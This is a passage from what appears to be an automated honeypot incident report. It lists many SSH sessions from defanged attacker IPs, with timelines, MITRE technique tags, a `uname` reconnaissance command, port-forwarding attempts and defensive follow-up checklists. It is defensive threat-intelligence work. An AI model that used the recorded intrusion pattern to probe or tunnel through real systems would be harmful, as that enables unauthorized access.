| `2026-08-14 07:13:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb5ea1ce678d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:13 |
| **Last Seen** | 2026-08-14 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:13:56` | `cowrie.session.connect` |
| `2026-08-14 07:13:56` | `cowrie.client.version` |
| `2026-08-14 07:13:56` | `cowrie.client.kex` |
| `2026-08-14 07:13:56` | `cowrie.login.success` |
| `2026-08-14 07:13:57` | `cowrie.session.params` |
| `2026-08-14 07:13:57` | `cowrie.command.input` |
| `2026-08-14 07:13:57` | `cowrie.log.closed` |
| `2026-08-14 07:13:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb1e2d45029a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:14 |
| **Last Seen** | 2026-08-14 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:14:00` | `cowrie.session.connect` |
| `2026-08-14 07:14:00` | `cowrie.client.version` |
| `2026-08-14 07:14:01` | `cowrie.client.kex` |
| `2026-08-14 07:14:01` | `cowrie.login.success` |
| `2026-08-14 07:14:02` | `cowrie.session.params` |
| `2026-08-14 07:14:02` | `cowrie.command.input` |
| `2026-08-14 07:14:02` | `cowrie.log.closed` |
| `2026-08-14 07:14:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4189ef0aa420

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:14 |
| **Last Seen** | 2026-08-14 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:14:06` | `cowrie.session.connect` |
| `2026-08-14 07:14:06` | `cowrie.client.version` |
| `2026-08-14 07:14:06` | `cowrie.client.kex` |
| `2026-08-14 07:14:06` | `cowrie.login.success` |
| `2026-08-14 07:14:07` | `cowrie.session.params` |
| `2026-08-14 07:14:07` | `cowrie.command.input` |
| `2026-08-14 07:14:07` | `cowrie.log.closed` |
| `2026-08-14 07:14:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-586d517a4120

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:14 |
| **Last Seen** | 2026-08-14 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:14:11` | `cowrie.session.connect` |
| `2026-08-14 07:14:11` | `cowrie.client.version` |
| `2026-08-14 07:14:11` | `cowrie.client.kex` |
| `2026-08-14 07:14:11` | `cowrie.login.success` |
| `2026-08-14 07:14:12` | `cowrie.session.params` |
| `2026-08-14 07:14:12` | `cowrie.command.input` |
| `2026-08-14 07:14:12` | `cowrie.log.closed` |
| `2026-08-14 07:14:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a9eada5a998

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:14 |
| **Last Seen** | 2026-08-14 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:14:16` | `cowrie.session.connect` |
| `2026-08-14 07:14:16` | `cowrie.client.version` |
| `2026-08-14 07:14:16` | `cowrie.client.kex` |
| `2026-08-14 07:14:16` | `cowrie.login.success` |
| `2026-08-14 07:14:17` | `cowrie.session.params` |
| `2026-08-14 07:14:17` | `cowrie.command.input` |
| `2026-08-14 07:14:17` | `cowrie.log.closed` |
| `2026-08-14 07:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3107d43d3afd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:14 |
| **Last Seen** | 2026-08-14 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:14:21` | `cowrie.session.connect` |
| `2026-08-14 07:14:21` | `cowrie.client.version` |
| `2026-08-14 07:14:21` | `cowrie.client.kex` |
| `2026-08-14 07:14:21` | `cowrie.login.success` |
| `2026-08-14 07:14:22` | `cowrie.session.params` |
| `2026-08-14 07:14:22` | `cowrie.command.input` |
| `2026-08-14 07:14:22` | `cowrie.log.closed` |
| `2026-08-14 07:14:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9c9880f0b43

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:14 |
| **Last Seen** | 2026-08-14 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:14:25` | `cowrie.session.connect` |
| `2026-08-14 07:14:26` | `cowrie.client.version` |
| `2026-08-14 07:14:26` | `cowrie.client.kex` |
| `2026-08-14 07:14:26` | `cowrie.login.success` |
| `2026-08-14 07:14:27` | `cowrie.session.params` |
| `2026-08-14 07:14:27` | `cowrie.command.input` |
| `2026-08-14 07:14:27` | `cowrie.log.closed` |
| `2026-08-14 07:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-593830260219

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:14 |
| **Last Seen** | 2026-08-14 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:14:30` | `cowrie.session.connect` |
| `2026-08-14 07:14:30` | `cowrie.client.version` |
| `2026-08-14 07:14:30` | `cowrie.client.kex` |
| `2026-08-14 07:14:31` | `cowrie.login.success` |
| `2026-08-14 07:14:32` | `cowrie.session.params` |
| `2026-08-14 07:14:32` | `cowrie.command.input` |
| `2026-08-14 07:14:32` | `cowrie.log.closed` |
| `2026-08-14 07:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ddf505c7f89

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:14 |
| **Last Seen** | 2026-08-14 07:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:14:35` | `cowrie.session.connect` |
| `2026-08-14 07:14:35` | `cowrie.client.version` |
| `2026-08-14 07:14:35` | `cowrie.client.kex` |
| `2026-08-14 07:14:36` | `cowrie.login.success` |
| `2026-08-14 07:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-358399ee0603

| Field | Detail |
|---|---|
| **Source IP** | `78.187.230[.]168` |
| **First Seen** | 2026-08-14 07:23 |
| **Last Seen** | 2026-08-14 07:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:23:22` | `cowrie.session.connect` |
| `2026-08-14 07:23:23` | `cowrie.client.version` |
| `2026-08-14 07:23:23` | `cowrie.client.kex` |
| `2026-08-14 07:23:24` | `cowrie.login.success` |
| `2026-08-14 07:23:25` | `cowrie.direct-tcpip.request` |
| `2026-08-14 07:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.230[.]168` to AbuseIPDB if not already reported
- [ ] Block `78.187.230[.]168` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-896b7ae9f41f

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]88` |
| **First Seen** | 2026-08-14 07:30 |
| **Last Seen** | 2026-08-14 07:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:30:39` | `cowrie.session.connect` |
| `2026-08-14 07:30:39` | `cowrie.client.version` |
| `2026-08-14 07:30:39` | `cowrie.client.kex` |
| `2026-08-14 07:30:41` | `cowrie.login.success` |
| `2026-08-14 07:30:41` | `cowrie.direct-tcpip.request` |
| `2026-08-14 07:30:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]88` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-922438f25a3a

| Field | Detail |
|---|---|
| **Source IP** | `113.108.88[.]121` |
| **First Seen** | 2026-08-14 07:33 |
| **Last Seen** | 2026-08-14 07:33 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:33:15` | `cowrie.session.connect` |
| `2026-08-14 07:33:15` | `cowrie.client.version` |
| `2026-08-14 07:33:15` | `cowrie.client.kex` |
| `2026-08-14 07:33:20` | `cowrie.login.success` |
| `2026-08-14 07:33:21` | `cowrie.direct-tcpip.request` |
| `2026-08-14 07:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.108.88[.]121` to AbuseIPDB if not already reported
- [ ] Block `113.108.88[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11af14d80340

| Field | Detail |
|---|---|
| **Source IP** | `81.214.75[.]248` |
| **First Seen** | 2026-08-14 07:33 |
| **Last Seen** | 2026-08-14 07:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:33:26` | `cowrie.session.connect` |
| `2026-08-14 07:33:27` | `cowrie.client.version` |
| `2026-08-14 07:33:27` | `cowrie.client.kex` |
| `2026-08-14 07:33:28` | `cowrie.login.success` |
| `2026-08-14 07:33:28` | `cowrie.direct-tcpip.request` |
| `2026-08-14 07:33:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.214.75[.]248` to AbuseIPDB if not already reported
- [ ] Block `81.214.75[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f6ae570e49d

| Field | Detail |
|---|---|
| **Source IP** | `85.105.255[.]56` |
| **First Seen** | 2026-08-14 07:33 |
| **Last Seen** | 2026-08-14 07:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:33:34` | `cowrie.session.connect` |
| `2026-08-14 07:33:35` | `cowrie.client.version` |
| `2026-08-14 07:33:35` | `cowrie.client.kex` |
| `2026-08-14 07:33:36` | `cowrie.login.success` |
| `2026-08-14 07:33:37` | `cowrie.direct-tcpip.request` |
| `2026-08-14 07:33:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.255[.]56` to AbuseIPDB if not already reported
- [ ] Block `85.105.255[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0a2ed768fe7

| Field | Detail |
|---|---|
| **Source IP** | `47.77.182[.]54` |
| **First Seen** | 2026-08-14 07:35 |
| **Last Seen** | 2026-08-14 07:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:35:47` | `cowrie.session.connect` |
| `2026-08-14 07:35:48` | `cowrie.telnet.option` |
| `2026-08-14 07:35:48` | `cowrie.telnet.option` |
| `2026-08-14 07:36:49` | `cowrie.login.success` |
| `2026-08-14 07:36:49` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `47.77.182[.]54` to AbuseIPDB if not already reported
- [ ] Block `47.77.182[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f796c64c2ac

| Field | Detail |
|---|---|
| **Source IP** | `65.20.163[.]103` |
| **First Seen** | 2026-08-14 07:35 |
| **Last Seen** | 2026-08-14 07:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:35:48` | `cowrie.session.connect` |
| `2026-08-14 07:35:49` | `cowrie.client.version` |
| `2026-08-14 07:35:49` | `cowrie.client.kex` |
| `2026-08-14 07:35:50` | `cowrie.login.success` |
| `2026-08-14 07:35:51` | `cowrie.direct-tcpip.request` |
| `2026-08-14 07:35:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.163[.]103` to AbuseIPDB if not already reported
- [ ] Block `65.20.163[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9ca9d65bf12

| Field | Detail |
|---|---|
| **Source IP** | `179.181.133[.]153` |
| **First Seen** | 2026-08-14 07:35 |
| **Last Seen** | 2026-08-14 07:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:35:57` | `cowrie.session.connect` |
| `2026-08-14 07:35:58` | `cowrie.client.version` |
| `2026-08-14 07:35:58` | `cowrie.client.kex` |
| `2026-08-14 07:36:00` | `cowrie.login.success` |
| `2026-08-14 07:36:01` | `cowrie.direct-tcpip.request` |
| `2026-08-14 07:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.181.133[.]153` to AbuseIPDB if not already reported
- [ ] Block `179.181.133[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b28317f9aef3

| Field | Detail |
|---|---|
| **Source IP** | `78.189.17[.]35` |
| **First Seen** | 2026-08-14 07:39 |
| **Last Seen** | 2026-08-14 07:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:39:27` | `cowrie.session.connect` |
| `2026-08-14 07:39:28` | `cowrie.client.version` |
| `2026-08-14 07:39:28` | `cowrie.client.kex` |
| `2026-08-14 07:39:29` | `cowrie.login.success` |
| `2026-08-14 07:39:30` | `cowrie.direct-tcpip.request` |
| `2026-08-14 07:39:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.189.17[.]35` to AbuseIPDB if not already reported
- [ ] Block `78.189.17[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2bcb70cb834

| Field | Detail |
|---|---|
| **Source IP** | `87.225.108[.]138` |
| **First Seen** | 2026-08-14 07:57 |
| **Last Seen** | 2026-08-14 07:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:57:20` | `cowrie.session.connect` |
| `2026-08-14 07:57:21` | `cowrie.client.version` |
| `2026-08-14 07:57:21` | `cowrie.client.kex` |
| `2026-08-14 07:57:23` | `cowrie.login.success` |
| `2026-08-14 07:57:24` | `cowrie.direct-tcpip.request` |
| `2026-08-14 07:57:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.225.108[.]138` to AbuseIPDB if not already reported
- [ ] Block `87.225.108[.]138` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47b727ae58a4

| Field | Detail |
|---|---|
| **Source IP** | `210.206.24[.]237` |
| **First Seen** | 2026-08-14 07:57 |
| **Last Seen** | 2026-08-14 07:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:57:29` | `cowrie.session.connect` |
| `2026-08-14 07:57:30` | `cowrie.client.version` |
| `2026-08-14 07:57:30` | `cowrie.client.kex` |
| `2026-08-14 07:57:32` | `cowrie.login.success` |
| `2026-08-14 07:57:32` | `cowrie.direct-tcpip.request` |
| `2026-08-14 07:57:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.206.24[.]237` to AbuseIPDB if not already reported
- [ ] Block `210.206.24[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11ed52333356

| Field | Detail |
|---|---|
| **Source IP** | `196.203.231[.]220` |
| **First Seen** | 2026-08-14 08:04 |
| **Last Seen** | 2026-08-14 08:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:04:51` | `cowrie.session.connect` |
| `2026-08-14 08:04:51` | `cowrie.client.version` |
| `2026-08-14 08:04:51` | `cowrie.client.kex` |
| `2026-08-14 08:04:52` | `cowrie.login.success` |
| `2026-08-14 08:04:53` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:04:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.203.231[.]220` to AbuseIPDB if not already reported
- [ ] Block `196.203.231[.]220` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86c38e6ba6d1

| Field | Detail |
|---|---|
| **Source IP** | `121.189.198[.]60` |
| **First Seen** | 2026-08-14 08:07 |
| **Last Seen** | 2026-08-14 08:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:07:12` | `cowrie.session.connect` |
| `2026-08-14 08:07:13` | `cowrie.client.version` |
| `2026-08-14 08:07:13` | `cowrie.client.kex` |
| `2026-08-14 08:07:15` | `cowrie.login.success` |
| `2026-08-14 08:07:16` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.198[.]60` to AbuseIPDB if not already reported
- [ ] Block `121.189.198[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e84aaa17f65

| Field | Detail |
|---|---|
| **Source IP** | `45.118.49[.]18` |
| **First Seen** | 2026-08-14 08:07 |
| **Last Seen** | 2026-08-14 08:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:07:27` | `cowrie.session.connect` |
| `2026-08-14 08:07:28` | `cowrie.client.version` |
| `2026-08-14 08:07:28` | `cowrie.client.kex` |
| `2026-08-14 08:07:30` | `cowrie.login.success` |
| `2026-08-14 08:07:31` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:07:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.118.49[.]18` to AbuseIPDB if not already reported
- [ ] Block `45.118.49[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ef106df3890

| Field | Detail |
|---|---|
| **Source IP** | `81.172.74[.]163` |
| **First Seen** | 2026-08-14 08:07 |
| **Last Seen** | 2026-08-14 08:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:07:38` | `cowrie.session.connect` |
| `2026-08-14 08:07:38` | `cowrie.client.version` |
| `2026-08-14 08:07:38` | `cowrie.client.kex` |
| `2026-08-14 08:07:40` | `cowrie.login.success` |
| `2026-08-14 08:07:40` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.172.74[.]163` to AbuseIPDB if not already reported
- [ ] Block `81.172.74[.]163` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c0cb15bf108

| Field | Detail |
|---|---|
| **Source IP** | `124.160.45[.]26` |
| **First Seen** | 2026-08-14 08:09 |
| **Last Seen** | 2026-08-14 08:10 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:09:58` | `cowrie.session.connect` |
| `2026-08-14 08:10:00` | `cowrie.client.version` |
| `2026-08-14 08:10:00` | `cowrie.client.kex` |
| `2026-08-14 08:10:05` | `cowrie.login.success` |
| `2026-08-14 08:10:07` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:10:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.160.45[.]26` to AbuseIPDB if not already reported
- [ ] Block `124.160.45[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baf9986f648a

| Field | Detail |
|---|---|
| **Source IP** | `203.193.147[.]75` |
| **First Seen** | 2026-08-14 08:10 |
| **Last Seen** | 2026-08-14 08:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 08:10:13` | `cowrie.session.connect` |
| `2026-08-14 08:10:14` | `cowrie.client.version` |
| `2026-08-14 08:10:14` | `cowrie.client.kex` |
| `2026-08-14 08:10:17` | `cowrie.login.success` |
| `2026-08-14 08:10:17` | `cowrie.direct-tcpip.request` |
| `2026-08-14 08:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
